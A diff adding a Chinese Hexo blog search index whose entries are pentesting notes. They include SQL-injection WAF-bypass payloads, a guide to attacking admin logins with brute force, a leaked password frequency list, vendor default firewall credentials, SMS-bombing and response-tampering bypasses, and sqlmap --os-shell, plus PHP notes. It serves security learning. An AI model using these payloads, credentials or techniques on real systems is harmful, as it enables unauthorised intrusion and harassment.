@@ -1,0 +1,1309 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>SQL注入绕过</title>
+    <url>/2019/10/24/QL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/</url>
+    <content><![CDATA[<p>一、资源限制角度绕过</p>
+<pre><code>1、POST大BODY</code></pre><p> 二、协议层面绕过WAF的检测<br>     <a id="more"></a><br>        1、协议未覆盖绕过WAF<br>                *请求方式变换 get  -&gt;  post<br>                *content-type变换 </p>
+<pre><code>2、参数污染
+        index.php?id=1&amp;id=2
+
+        id=1
+        id=2
+        waf可能只检测id=1</code></pre><p> 三、规则层面的绕过</p>
+<pre><code>1、sql注释符绕过
+         level-1   union/**/select
+         level-2   union/*ajlsjdlf*/select
+
+2、空白符绕过
+         mysql空白符：%09，%0A。。。
+         正则空白符：  %09，%0A
+         example-1：union%250Cselect
+
+3、函数分分割符号
+         在函数和数据中间引入一些内容
+         concat%2520(
+         concat/**/(
+         concat%250c(
+
+4、浮点数词法解析
+         select * from users where id=8E0union select 1,2,3,4
+
+5、利用error-based进行sql注入：error-based sql注入函数非常容易被忽略
+            extractvalue(1, concat(0x5c,md5(3)));
+                updatexml(1,concat(0x5d,md5(3)),1);
+
+6、mysql特殊语法
+                select{x table_name}from{x information_schema.tables};</code></pre><p>四、Fuzz绕过waf</p>
+<pre><code>1、注释符绕过
+            *先测试最基本的： union/**/select
+            *再测试中间引入特殊字：union/*aaaa%01bbs*/select
+            *最后测试注释长度：union/*aaaaaaaaaaaaaaaa*/select
+            最基本的模式
+        union/*something*/select
+            将空格替换为/*sldfj$%^&amp;*/
+            特殊函数 xx() 替换为 xx/*sldfj$%^&amp;*/()</code></pre><p>五、SQLmap waf绕过脚本编写</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>谈谈如何进行后台渗透</title>
+    <url>/2019/08/29/%E5%8F%B0%E6%B8%97%E9%80%8F/</url>
+    <content><![CDATA[<p>安全客首发：<a href="https://www.anquanke.com/post/id/185426" target="_blank" rel="noopener">https://www.anquanke.com/post/id/185426</a></p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有些朋友在渗透时扫描到后台登陆界面，却不知道如何入手。最近刚好在某公司做渗透实习，对目标固定的系统渗透有些体会。因此这里讲一下对网站后台登陆界面的渗透思路，希望能为大家提供一些帮助。</p>
+<a id="more"></a>
+<h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><p>本人在进入登陆界面时，一般都是先用万能密码什么的测下输入框有没有注入（现在很少见了）。如果没有，那就先拿admin，123456什么的测试下弱口令，不求运气爆棚一下就猜到密码。主要是看下回显，查看是否存在<strong>账号锁定策略</strong>，<strong>密码不正确</strong>，<strong>不存在此用户名</strong>等信息，以便于尝试遍历可能存在的用户名。没验证码就上爆破工具，有验证码的话看看能不能绕过,实在不行手工测几个账号密码碰碰运气。</p>
+<h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><p>如果没验证码阻碍，那爆破没什么好说的，拿个好字典，直接干就是了。</p>
+<p>不过注意下有时密码传输会使用md5或者base64之类的加密，这时除了自己写脚本外，可以使用burpsuite的intruder模块内容。<br><img src="https://p1.ssl.qhimg.com/t0191be6af38f915f1e.png" alt=""><br><img src="https://p4.ssl.qhimg.com/t0148affe69b5930de9.png" alt=""></p>
+<p>爆破的传统思路都是固定账号爆破密码，还有一种姿势是固定密码爆破用户名。比如使用固定密码123456，爆破常用用户名或者常用人名拼音。</p>
+<h1 id="扫目录"><a href="#扫目录" class="headerlink" title="扫目录"></a>扫目录</h1><p>目录扫描也是一个存在惊喜的地方，说不定能扫描到后台未授权访问的链接、备份文件、编辑器、敏感信息等。<br>像后台登陆的网址看多了，常规的路径像<a href="http://www.xxx.com/admin/login.aspx(.php)" target="_blank" rel="noopener">www.xxx.com/admin/login.aspx(.php)</a><br>老司机甚至不用御剑什么的工具跑，就能直接猜到。</p>
+<p>一般碰到下面这种情况，可采用fuzz大法。一层一层fuzz，尝试寻找可利用的信息。漏洞银行有一期衬衫的视频fuzz讲得很好。他用的工具是wfuzz，感觉不错，感兴趣的可以去看看。<br><img src="https://p0.ssl.qhimg.com/t01c2681c8f06da3268.png" alt=""></p>
+<p><img src="https://p0.ssl.qhimg.com/t01c6fd0d2e690408a3.png" alt=""></p>
+<p><strong>这里给大家讲一下我做授权渗透的一个案列:</strong><br>一般给客户的后台系统做渗透，客户都会给个测试账号，除了测登陆界面外，还测下后台的功能模块。但这次当我问客户要账号密码时，客户回：你们不是要模拟黑客做渗透测试吗，那就自己打进去啊。( ╯□╰ )好吧，作为实习生的我也只能硬着头皮刚登陆界面了。</p>
+<p>先看了下链接，发现是Java站，且链接是.do结尾，但struct2工具试了下没成功。<br><img src="https://p0.ssl.qhimg.com/t0188917341bd56a82c.png" alt=""></p>
+<p>看了下登陆界面，有验证码，网站看去的版本也挺新的，感觉不太好搞。<br><img src="https://p1.ssl.qhimg.com/t0154e09713daf703ee.png" alt=""></p>
+<p>测下注入无果，于是抓包看下验证码是否可以绕过或者不变，结果这个验证码很称职，爆破不了。验证码辨认还算清楚，不过验证码识别，总觉得不太靠谱。。。等绝望了找不到洞再试吧。于是去扫了下目录。诶，发现有好东西。<br><img src="https://p2.ssl.qhimg.com/t01c6025996c028d285.png" alt=""></p>
+<p>首先扫到了一个services服务路径<br><img src="https://p4.ssl.qhimg.com/t01177393be539adcaa.png" alt=""><br>知道了Apache Axis组件的版本信息<br><img src="https://p3.ssl.qhimg.com/t01cf0c06ab23a30590.png" alt=""><br>然后马上想到这个组件当时刚爆出一个RCE漏洞<br>poc链接：<a href="https://github.com/KibodWapon/Axis-1.4-RCE-Poc" target="_blank" rel="noopener">https://github.com/KibodWapon/Axis-1.4-RCE-Poc</a><br>结果试了下没成功。然后再尝试了四月份CNVD看到的RCE漏洞也无果。</p>
+<p>还扫出了一个ckfinder编辑器<br><a href="http://xxx.xxx.com/ckfinder/ckfinder.html" target="_blank" rel="noopener">http://xxx.xxx.com/ckfinder/ckfinder.html</a><br><img src="https://p2.ssl.qhimg.com/t0142134935842018e1.png" alt=""><br>一看，我滴乖乖，难道已经有黑客搞进去了？<br>赶紧网上找了下这个版本有存在什么漏洞，并尝试文件上传绕过。但很遗憾，这个网站并不存在解析漏洞，利用不了，文件上传也没绕过。不过令人庆幸的是，黑客应该也没有利用成功。</p>
+<p>。。。<br>又挖了一段时间，同事竟然说他拿shell了！<br>what?<img src="https://p5.ssl.qhimg.com/t011009fcb5086a77ad.jpg" alt=""></p>
+<p>发现他扫目录扫到了<a href="http://xxx.xx.com/manager/html" target="_blank" rel="noopener">http://xxx.xx.com/manager/html</a><br><img src="https://p2.ssl.qhimg.com/t01aeb462a5c3091629.png" alt=""><br>然后一个admin/123456弱口令进入tomcat后台，然后传war包成功拿到shell<br><img src="https://p5.ssl.qhimg.com/t01ccc1326dd7d97eec.png" alt=""><br>看了这波操作久久无语，看来我的字典太差，tomcat目录都没扫出来。还有弱口令漏洞，真的很无敌。</p>
+<h1 id="框架漏洞"><a href="#框架漏洞" class="headerlink" title="框架漏洞"></a>框架漏洞</h1><p>对一些CMS，已经比较成熟了，漏洞确实不好挖。如果网上（乌云，seebug，搜索引擎等）的历史漏洞没有复现成功，那一般情况下就只能寻找下逻辑漏洞、网站管理员配置错误或者弱口令什么的。</p>
+<p>对于一些不知名的框架，一般也可通过登陆界面底下的声明中找到开发公司和产品版本时间。<br><img src="https://p1.ssl.qhimg.com/t01cb53b93b9911786f.png" alt=""><br>在网上找找此公司产品是否爆出过漏洞。若是开源的框架，还可下载源码进行代码审计寻找漏洞。</p>
+<p>像java的站，登陆页面是.do或.action的网址。可尝试下 struts2 命令执行漏洞，本人一般使用安恒的S2漏洞验证工具。<br><img src="https://p4.ssl.qhimg.com/t017f66302d5c223a2e.png" alt=""></p>
+<p>又如thinkphp的CMS，可尝试下是否存在相应版本的命令执行漏洞。本人曾在邮储银行的一个系统登陆界面挖到tp5命令执行漏洞拿到shell，补天评了1700元。emmmm,当然厂商说漏洞无影响给拒了就是另一回事了……<br><img src="https://p5.ssl.qhimg.com/t015f5dd4f36826d7ea.png" alt=""></p>
+<h1 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h1><p>可能有些小伙伴对弱口令嗤之以鼻，觉得它没有技术含量，但其实不然，结合社工，它的作用和危害可能比其他漏洞更大，希望大家重视。</p>
+<p>刚巧最近有去公安厅复测6月HW的漏洞，检测漏洞是否修复。几十份报告，原以为要花很长时间，但结果却是：差不多半小时就完成了，且部分时间是花在输入网址上（报告不给拷到自己电脑上，只能看着公安厅电脑的报告手打网址）。<br>耗时少的其中一个原因是漏洞有<strong>八、九层</strong>的漏洞都是弱口令，其中大部分漏洞还都是部委级别的系统，所以测的很快。虽然hw期间比较特殊，还是比例这么大还是挺能说明问题的。</p>
+<p><strong>以下是某大佬对14年底12306泄露密码的统计分析</strong></p>
+<p>哈哈，可以发现我国还是对数字情有独钟，国外的top100弱口令还是不适合我大天朝的国情。很少有password,football之类的英文密码。<br>密码中包含有 123456 数字的，出现 3236 次<br>密码中包含有 123 数字的，出现 11213 次<br>密码中包含有 520 数字的，出现 4549 次<br>密码中包含有 1314 数字的，出现 3113 次<br>密码中包含有 aini 的，出现 877 次<br>`</p>
+<pre><code>次数 密码
+392 123456
+281 a123456
+165 123456a
+161 5201314
+157 111111
+136 woaini1314
+ 98 qq123456
+ 98 123123
+ 97 000000
+ 93 1qaz2wsx
+ 83 1q2w3e4r
+ 80 qwe123
+ 76 7758521
+ 68 123qwe
+ 63 a123123
+ 56 woaini520
+ 55 123456aa
+ 52 1314520
+ 52 100200
+ 51 woaini
+ 50 woaini123
+ 50 123321
+ 49 q123456
+ 49 123456789
+ 48 asd123
+ 48 a123456789
+ 48 5211314
+ 48 123456789a
+ 47 z123456
+ 47 asd123456
+ 45 a5201314
+ 42 zhang123
+ 41 aa123456
+ 40 123123a
+ 38 aptx4869
+ 37 1qazxsw2
+ 37 1q2w3e4r5t
+ 36 5201314a
+ 35 aini1314
+ 35 1q2w3e
+ 34 woaini521
+ 34 q1w2e3r4
+ 34 31415926
+ 34 123456qq
+ 33 a111111
+ 33 520520
+ 33 1234qwer
+ 29 123456abc
+ 29 111111a
+ 29 110110
+ 28 w123456
+ 28 abc123
+ 28 7758258
+ 26 iloveyou
+ 26 159753
+ 25 qwer1234
+ 25 a000000
+ 24 zxc123
+ 24 123qweasd
+ 24 123654
+ 23 qq123123
+ 23 abc123456
+ 23 123456q
+ 22 qq5201314
+ 22 12345678
+ 21 456852
+ 21 000000a
+ 20 1314521
+ 19 zxc123456
+ 19 asdasd
+ 19 as123456
+ 19 666666
+ 19 521521
+ 19 112233
+ 18 q1w2e3
+ 18 abcd1234
+ 18 aaa123
+ 17 qazwsx123
+ 17 qaz123
+ 17 aaaaaa
+ 17 a123321
+ 17 12qwaszx
+ 17 123000
+ 17 11111111
+ 16 zxcvbnm123
+ 16 wang123
+ 16 s123456
+ 16 nihao123
+ 16 love1314
+ 16 caonima123
+ 16 asdasd123
+ 16 753951
+ 16 5845201314
+ 16 584520
+ 16 159357
+ 16 147258
+ 16 1123581321
+ 16 110120
+ 15 hao123
+ 15 a7758521</code></pre><p>` </p>
+<p><strong>遇到网络设备，基本像交换机、路由器、安全设备之类的，可以尝试一下默认密码</strong></p>
+<p>网上找到的，但忘了是哪个大佬发的了。</p>
+<blockquote>
+<p>天融信防火墙，不需要证书 登录地址:<a href="https://192.168.1.254" target="_blank" rel="noopener">https://192.168.1.254</a> 用户名:superman 密码:talent 技术支持热线：8008105119<br>天融信防火墙，不需要证书 登录地址:<a href="https://192.168.1.254：8080">https://192.168.1.254：8080</a> 用户名:superman 密码:talent！23 遇到设备需要把旧设备配置备份下来，再倒入新设备基于console口登陆，用户名，密码跟web界面一致 system config reset 清除配置 save 保存 联想网御防火墙，需要证书（最好用IE浏览器登录）<br>登录地址:<a href="https://10.1.5.254:8889" target="_blank" rel="noopener">https://10.1.5.254:8889</a> 用户名:admin 密码:leadsec@7766、administrator、bane@7766 技术支持热线：4008107766 010-56632666<br>深信服防火墙（注安全设备管理地址不是唯一的） <a href="https://10.251.251.251" target="_blank" rel="noopener">https://10.251.251.251</a><br><a href="https://10.254.254.254" target="_blank" rel="noopener">https://10.254.254.254</a> 用户名：admin 密码：admin 技术支持热线：4006306430<br>启明星辰 <a href="https://10.1.5.254:8889" target="_blank" rel="noopener">https://10.1.5.254:8889</a> 用户名：admin 密码：bane@7766<br><a href="https://10.50.10.45:8889" target="_blank" rel="noopener">https://10.50.10.45:8889</a> 用户名：admin 密码：admin@123 电脑端IP：10.50.10.44/255.255.255.0 技术支持热线：4006243900<br>juniper 登录地址:<a href="https://192.168.1.1" target="_blank" rel="noopener">https://192.168.1.1</a> 用户名:netscreen 密码:netscreen<br>Cisco 登录地址:<a href="https://192.168.0.1" target="_blank" rel="noopener">https://192.168.0.1</a> 用户名:admin 密码:cisco<br>Huawei 登录地址:<a href="http://192.168.0.1" target="_blank" rel="noopener">http://192.168.0.1</a> 用户名:admin 密码:Admin@123<br>H3C 登录地址:<a href="http://192.168.0.1" target="_blank" rel="noopener">http://192.168.0.1</a> 用户名:admin 密码:admin 技术支持热线：4006306430<br>绿盟IPS <a href="https://192.168.1.101" target="_blank" rel="noopener">https://192.168.1.101</a> 用户名: weboper 密码: weboper 配置重启生效<br>网神防火墙GE1口 <a href="https://10.50.10.45" target="_blank" rel="noopener">https://10.50.10.45</a> 用户名：admin 密码：firewall 技术支持热线：4006108220<br>深信服VPN： 51111端口 delanrecover<br>华为VPN：账号：root 密码：mduadmin<br>华为防火墙： admin Admin@123 eudemon<br>eudemon Juniper防火墙： netscreen netscreen<br>迪普 192.168.0.1 默认的用户名和密码（admin/admin_default)<br>山石 192.168.1.1 默认的管理账号为hillstone，密码为hillstone<br>安恒的明御防火墙 admin/adminadmin<br>某堡垒机 shterm/shterm<br>天融信的vpn test/123456</p>
+</blockquote>
+<h1 id="社工"><a href="#社工" class="headerlink" title="社工"></a>社工</h1><p>在我看来社工是很牛逼的一种攻击方式，有时可以四两拨千斤。</p>
+<p>像教育站，登陆账号可能是学号，密码是身份证后六位。百度查xxx学校一卡通丢失，一般就能从某学生的失物启示找到学号。</p>
+<p>或者在文章标题下，若存在作者名字，可能就是用户名<br><img src="https://p5.ssl.qhimg.com/t016b9f4c815648e721.png" alt=""></p>
+<p>密码除结合管理员电话，qq，姓名等外，还可注意下网站的一些关键词。曾挖过一个弱口令漏洞，密码是网站域名+123，都不用生成字典就进后台了。</p>
+<p>最近刚好参加某省护网，讲个例子：对某系统爆破admin用户的密码没成功，于是在<strong>联系我们</strong>处找到了管理员的一些信息，想生成社工字典试下运气。<br><img src="https://p2.ssl.qhimg.com/t01b112ce877f213293.png" alt=""><br>本想直接用社工密码生成工具生成字典爆破一下的，但突然想到注册处可以遍历用户名是否存在<br><img src="https://p2.ssl.qhimg.com/t0115037f1ceb7510e3.png" alt=""><br><img src="https://p2.ssl.qhimg.com/t0123db921935e12eb8.png" alt=""><br>于是结合社工尝试几个账号，发现联系我们处的管理员的账号是<code>姓氏首字母加名字全拼</code>，然后一爆破，密码123456直接进去后台。并在后台的搜索处发现Sql注入，再用sqlmap神器的命令 –os-shell成功打开xpcmdshell，拿到系统权限。</p>
+<p>社工密码字典生成,怕麻烦的可使用在线网站生成：<a href="http://tools.mayter.cn/" target="_blank" rel="noopener">http://tools.mayter.cn/</a><br><img src="https://p1.ssl.qhimg.com/t01109efde6ba6991ee.png" alt=""></p>
+<p>也可使用cupp这款工具，这是一款交互式的工具，使用比较简单<br>地址：<a href="https://github.com/Mebus/cupp.git" target="_blank" rel="noopener">https://github.com/Mebus/cupp.git</a></p>
+<p><img src="https://p0.ssl.qhimg.com/t0179bc4df8e72e577c.png" alt=""></p>
+<p><img src="https://p4.ssl.qhimg.com/t019894628af2f960fd.png" alt=""><br>看看生成的密码：<br><img src="https://p2.ssl.qhimg.com/t0128accab96c99457f.png" alt=""></p>
+<p><img src="https://p0.ssl.qhimg.com/t01ea6067f89e2d4bdf.png" alt=""><br>另一款是cewl，它通过爬行网站获取关键信息创建一个密码字典。<br>但我用了下，感觉生成的字典比较多冗余信息，很多关联不大的汉字都包含在字典中，个人觉得不是特别好用。</p>
+<p>还有最近freebuf看了一篇文章，才发现hashcat这款爆破工具也能生成社工字典，感兴趣的朋友也可以去试试。</p>
+<h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h1><p>逻辑漏洞是由于一些程序员未考虑到或者为贪图省事，而造成的逻辑上的漏洞，一般waf不容易拦截，因此和弱口令漏洞都是现在相对容易挖掘的一类漏洞。逻辑漏洞种类十分丰富，这里讲登陆框的逻辑漏洞，主要介绍一些技巧给大家拓宽一下思路，讲的不全请见谅。更详细的漏洞细节大家可以在网上查找资源（绝不是因为我懒）。</p>
+<h4 id="注册与忘记密码模块"><a href="#注册与忘记密码模块" class="headerlink" title="注册与忘记密码模块"></a>注册与忘记密码模块</h4><p><strong>云短信接受平台</strong><br>相信有些朋友在测试注册模块的时候，会使用自己的手机号，而这就带来隐患：信息泄露，和短信骚扰。<br>这里给大家提供两个短信接受平台，让大家免去烦恼：<br><a href="https://www.pdflibr.com/" target="_blank" rel="noopener">https://www.pdflibr.com/</a><br><a href="http://www.smszk.com/" target="_blank" rel="noopener">http://www.smszk.com/</a></p>
+<p><strong>遍历已注册用户</strong><br>这个上面的社工例子有讲，可查到用户是否存在。<br><img src="https://p2.ssl.qhimg.com/t0115037f1ceb7510e3.png" alt=""></p>
+<p><strong>任意用户注册</strong><br>注册用户不需验证码认证即可注册成功的情况下，可使用工具发包，恶意批量注册用户。<br><strong>修改发送包邮箱尝试覆盖注册</strong></p>
+<ol>
+<li>注册时显示某用户已注册；</li>
+<li>在注册新用户时抓包，更改自己的账号信息为admin用户；</li>
+<li>可能可以覆盖admin用户，重新注册成功。</li>
+</ol>
+<p><strong>任意密码重置</strong><br>修改密码时使用其他人的手机号，可抓包更改成自己的手机号。自己手机收到验证信息并输入，可更改他人密码成功。</p>
+<p><strong>跳过验证</strong><br>跳过验证步骤、找回方式，直接到设置新密码页面<br>这里直接用乌云的例子说明应该就懂了。<br><a href="http://www.anquan.us/static/bugs/wooyun-2015-098765.html" target="_blank" rel="noopener">中国电信某IDC机房信息安全管理系统设计缺陷致使系统沦陷</a></p>
+<p><strong>短信轰炸</strong><br>短信轰炸，一般人可能抓包重放失败后就放弃了。这里有个技巧，<br>是从西门吹雪师傅博文里学到的绕过的姿势：<br>发送短信处一般每隔60秒才能发送一次<br><img src="https://p1.ssl.qhimg.com/t015611b0de5d58935c.png" alt=""></p>
+<p>但若是发包时在手机号后加上一个空格、加号或换行符等特殊字符。然后重新发送，这时若发送成功，则说明可绕过限制。<br><img src="https://p2.ssl.qhimg.com/t010dcac0e34bee7bd8.png" alt=""></p>
+<p>此时在intruder模块只要持续递增空格就可造成无限短信轰炸<br><img src="https://p0.ssl.qhimg.com/t01eb13c826927a06f6.png" alt=""></p>
+<p><a href="http://ximcx.cn/post-143.html" target="_blank" rel="noopener">博文链接</a></p>
+<h4 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h4><p><strong>越权访问目录</strong><br>可越权访问到后台路径，网站组件配置文件，备份文件等，当然扫目录字典也要好。<br><strong>修改身份标识</strong><br>更改成功登陆的用户的身份标识，可能就能越权访问到其他用户的页面。<br>例如：1、本人之前曾用test用户弱口令漏洞登陆成功，然后更改参数越权访问到admin用户；2、曾看过一漏洞：用户认证的token值是用户名加时间戳的md5值，而恰好数据包某处就有返回用户名加时间戳，然后更改时间戳前的用户名，md5后加在token上成功越权到其他用户上（这种漏洞一般需要细心查找登陆时身份认证参数的规律）</p>
+<p>之前的任意密码重置等漏洞，其实也是修改用户身份标识，系统认证机制不完善导致漏洞出现。</p>
+<p><strong>抓返回包</strong><br>在登陆时返回包可能返回用户敏感信息，此时改一改参数说不定还能越权查到其他用户信息。<br>或注册、找回密码发送短信邮箱时，可能直接返回验证码等</p>
+<p>在返回包里，更改下参数为true、success、1，可能就能未授权进入后台</p>
+<ol>
+<li><p>登陆抓包，点击右键，抓取返回包<br><img src="https://p4.ssl.qhimg.com/t013f2385889f6a5d80.png" alt=""></p>
+</li>
+<li><p>观察返回的参数<br><img src="https://p5.ssl.qhimg.com/t01e555f9fbb606a9e2.png" alt=""></p>
+</li>
+<li><p>更改参数<br><img src="https://p3.ssl.qhimg.com/t010c9e10305b4839b8.png" alt=""></p>
+</li>
+<li><p>成功进入后台</p>
+</li>
+</ol>
+<p><strong>禁用js</strong></p>
+<p>曾经碰到过一个站点，能未登陆访问后台首页，但再次点击就会退出到登陆页面。此时禁用js，然后成功访问部分功能模块，成功利用文件上传拿到webshell。<br>因为有些网站的Url跳转是由前端js控制，这时禁用js后说不定就能成功访问。<br>下面是火狐的一个禁用js的插件<br><img src="https://p0.ssl.qhimg.com/t01c3635df103c3ad77.png" alt=""></p>
+<h1 id="看网站源码信息"><a href="#看网站源码信息" class="headerlink" title="看网站源码信息"></a>看网站源码信息</h1><p>当你思路枯竭的时候不妨看看源码，它是一块宝藏，说不定就能在里面发现惊喜。有些程序员会把后台的功能链接放在前端源码中,说不定就存在未授权访问，甚至有些奇葩程序员在前端代码存放测试的账号密码。</p>
+<p>首先给大家推荐一款工具，很强大：JSFinder<br>链接：<a href="https://github.com/Threezh1/JSFinder" target="_blank" rel="noopener">https://github.com/Threezh1/JSFinder</a><br>这是一款在网站的js文件中提取URL，子域名的工具，用在后台登陆界面抓取一些敏感的js文件效果也很不错，我曾用它抓取过网站后台的一个插件源码，后台的功能链接，敏感信息，接口链接（存在xss，注入）等等。我同学还说过burp也有抓js的插件，但可惜我没找到，用这款也差不多够用了。<br><img src="https://p2.ssl.qhimg.com/t01e6df3bdb2a5ab0ad.png" alt=""></p>
+<p><img src="https://p4.ssl.qhimg.com/t011b1d9202f0c1a3a1.png" alt=""></p>
+<p>这里讲一下乌云的一个案例，具体链接忘记了，就讲一下思路：<br>洞主之前发现了一个漏洞，提交后，等过一段时间再去瞧下那个站，发现系统大变样，连url的路径都改了，已经修复了吗？<br>但是当洞主右键查看源代码时，发现还保留着之前旧系统的链接和代码，有的只是注释了而已，关键是漏洞竟然还没修？！tql，这种开发建议直接祭天。</p>
+<p>看js代码，甚至一些图片的链接，说不定就有一番意外的收获。比如R3start大佬的一篇博文中讲的就很精彩<a href="http://r3start.net/index.php/2019/07/15/546" target="_blank" rel="noopener">从JS信息泄露到Webshell</a></p>
+<p>文章的思路是：<br>作者进行渗透时，在一个图片链接中发现了一个三级子域名，删掉URl、直接访问根路径发现了一个title是某管理平台的页面。<br>但页面无法正常加载，故进行目录扫描得到后台地址和后台js压缩包，然后在源码的某处JS代码中发现了多个可登录的账号。<br>尝试弱口令无果后，从js压缩包查到了默认密码规则。成功登陆一个普通用户，但发现权限并不大。<br>然后通过js代码寻找获取到了别的接口地址，发现存在越权漏洞，通过JS接口越权访问到活动管理页面获取到管理员的登陆账号。<br>最后找上传点，抓包改后缀拿shell一气呵成。</p>
+<p>引用R3start师傅的一句话：<br>右键查看JS源码，你可能会发现… 被注释的账号密码、接口、token、真实IP、开发环境…. 永远不知道程序员在JS中给你留下了什么样的惊喜。</p>
+<h1 id="端口漏洞"><a href="#端口漏洞" class="headerlink" title="端口漏洞"></a>端口漏洞</h1><h4 id="未授权漏洞"><a href="#未授权漏洞" class="headerlink" title="未授权漏洞"></a>未授权漏洞</h4><blockquote>
+<p>redis 6379</p>
+</blockquote>
+<blockquote>
+<p>MongoDB 27017</p>
+</blockquote>
+<h4 id="弱口令-1"><a href="#弱口令-1" class="headerlink" title="弱口令"></a>弱口令</h4><blockquote>
+<p>mysql    3306</p>
+</blockquote>
+<blockquote>
+<p>mssql         1433</p>
+</blockquote>
+<blockquote>
+<p>postgresql  5432</p>
+</blockquote>
+<blockquote>
+<p>ssh         22<br>ftp 21</p>
+</blockquote>
+<h4 id="相关CVE漏洞"><a href="#相关CVE漏洞" class="headerlink" title="相关CVE漏洞"></a>相关CVE漏洞</h4><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>其实在发安全客时挺仓促的，写的有点乱，并且还有url跳转和端口渗透忘了加上去了，大家将就看吧。<br>上面的内容比较杂，篇幅也比较长，所以有些地方就没有展开来讲。有些地方可能讲得比较简略模糊，请大家见谅，如果有疑惑可以联系我。</p>
+<p>顺便说下感想：<br>这段时间的安服实习对我带来很大的帮助，面对一些系统目标固定，不能横向渗透。C段、端口扫描、子域名挖掘等信息收集都做不了，只能硬着头皮怼目标。而做安全服务经常碰到的就是后台登陆界面，怼着怼着就成长了，毕竟孰能生巧。<br>虽然渗透比较艰难，但也培养了我的漏洞挖掘能力。反思下自己以前挖漏洞，都是走马观花，面对信息收集来的一大堆资产，都是随便测下就结束，并没有<strong>深入</strong>且<strong>细心</strong>地去寻找漏洞，导致之前的SRC挖掘之旅十分困难。因此希望新手在挖洞时能够更加细心，特别是挖掘SRC时，有时就得花时间一个参数一个参数去”怼”，才能有所收获。要相信，大力出奇迹！</p>
+]]></content>
+      <categories>
+        <category>渗透之路</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php学习笔记</title>
+    <url>/2019/08/09/php%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<ul>
+<li>PHP var_ dump()会返回变量的数据类型和值</li>
+<li>数组 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> $cars=<span class="keyword">array</span>(<span class="string">"Volvo"</span>=&gt;<span class="string">"key1"</span>,<span class="string">"BMW"</span>=&gt;<span class="string">"key2"</span>,<span class="string">"SAAB"</span>); <span class="comment">//cars[0]=SAAB,car['BMW']=key2</span></span><br><span class="line"><span class="number">2.</span> $cars=<span class="keyword">array</span>(<span class="string">"Volvo"</span>,<span class="string">"BMW"</span>,<span class="string">"SAAB"</span>);</span><br></pre></td></tr></table></figure>
+<a id="more"></a></li>
+</ul>
+<ul>
+<li>字符串函数</li>
+</ul>
+<blockquote>
+<p>strlen()  获得长度<br>strpos() 函数用于检索字符串内指定的字符或文本</p>
+</blockquote>
+<ul>
+<li><p><strong>常量定义</strong>：define(“GREETING”, “Welcome to W3School.com.cn!”，true) 第一个为变量，第二个为值，第三个为对大小写不敏感</p>
+</li>
+<li><p>整数 可用10，8，16进制</p>
+</li>
+<li><p>=&gt;  类似python的字典，键=&gt;值，当数组为=&gt;形式时，必须使用下列方式循环</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($array <span class="keyword">as</span> $value) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"$value &lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>PHP 变量后面加上一个大括号{}，里面填上数字，就是指 PHP 变量相应序号的字符。</p>
+</li>
+<li><p><em>例如：*</em><br>‘’’php<br>$str = ‘hello’;<br> ‘’’<br>   echo $str{0}; // 输出为 h ,也可以 $str[0]<br>   echo $str{1}; // 输出为 e ,也可以 $str[1]</p>
+</li>
+<li><p>字符和数字==比较时，会转换成十六进制比。</p>
+</li>
+<li><p>php几种写法：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;? echo <span class="number">1</span>; ?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php echo <span class="number">2</span>; ?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt; </span><br><span class="line">echo <span class="number">3</span>;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p><em>变量与字符串如何连接：*</em><br>变量使用   .   连接</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">echo <span class="string">'我的名字叫：'</span>.$name;</span><br></pre></td></tr></table></figure></li>
+<li><p><em>常量*</em></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> define(<span class="string">'name'</span>,<span class="string">"key"</span>);</span><br><span class="line"><span class="number">2.</span> <span class="keyword">const</span> KEY=<span class="string">"123"</span>;</span><br></pre></td></tr></table></figure></li>
+</ul>
+]]></content>
+      <categories>
+        <category>编程学习</category>
+      </categories>
+      <tags>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>乌云漏洞学习笔记</title>
+    <url>/2019/08/07/%E4%B9%8C%E4%BA%91%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h2 id="OX00-前言"><a href="#OX00-前言" class="headerlink" title="OX00 前言"></a>OX00 前言</h2><p>感觉自己的渗透水平还是很不足，特别是一些基础掌握得还不是很牢固。因此打算按照漏洞类型来，每天看100个。然后把对自己帮助比较大的和思路新奇的记录下来，以作学习。</p>
+<a id="more"></a>
+<h2 id="0X01-CSRF"><a href="#0X01-CSRF" class="headerlink" title="0X01 CSRF"></a>0X01 CSRF</h2><ul>
+<li>绑定微博、qq等链接处可能存在CSRF<blockquote>
+<p>blibili绑定微博的地方没有加token保护<br>导致可以csrf攻击，让别人点我链接，我的微博账号就和他的blibili账号绑定(新浪微博的授权有如下特点，如果当前登陆的微博曾经授权过bilibili，那么就会自动绑定成功,现在应该没有这个漏洞了)</p>
+</blockquote>
